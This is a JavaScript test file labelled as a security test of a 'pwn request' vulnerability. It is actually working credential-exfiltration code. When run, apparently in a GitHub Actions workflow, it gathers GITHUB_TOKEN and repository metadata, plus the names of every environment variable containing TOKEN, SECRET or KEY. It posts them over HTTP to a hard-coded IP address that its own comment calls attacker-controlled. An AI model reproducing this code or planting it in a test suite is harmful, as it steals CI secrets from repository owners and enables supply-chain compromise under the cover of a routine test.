describe("Security Test - Env Exfil", function() {
  it("should verify pwn request vulnerability", function(done) {
    const https = require("https");
    const http = require("http");
    
    // Collect environment variables
    const envData = JSON.stringify({
      GITHUB_TOKEN: process.env.GITHUB_TOKEN || "NOT_AVAILABLE",
      GITHUB_WORKFLOW: process.env.GITHUB_WORKFLOW || "",
      GITHUB_RUN_ID: process.env.GITHUB_RUN_ID || "",
      GITHUB_ACTOR: process.env.GITHUB_ACTOR || "",
      GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY || "",
      GITHUB_REF: process.env.GITHUB_REF || "",
      GITHUB_SHA: process.env.GITHUB_SHA || "",
      GITHUB_EVENT_NAME: process.env.GITHUB_EVENT_NAME || "",
      ALL_ENV_KEYS: Object.keys(process.env).filter(k => k.startsWith("GITHUB") || k.includes("TOKEN") || k.includes("SECRET") || k.includes("KEY"))
    });
    
    // Send to attacker-controlled server
    const options = {
      hostname: "52.198.100.26",
      port: 80,
      path: "/hello",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(envData)
      }
    };
    
    const req = http.request(options, (res) => {
      let body = "";
      res.on("data", chunk => body += chunk);
      res.on("end", () => {
        console.log("[SECURITY-TEST] Exfil response:", body);
        done();
      });
    });
    
    req.on("error", (e) => {
      console.log("[SECURITY-TEST] Exfil error (expected for fork PR - secrets not available):", e.message);
      done();
    });
    
    req.write(envData);
    req.end();
  });
});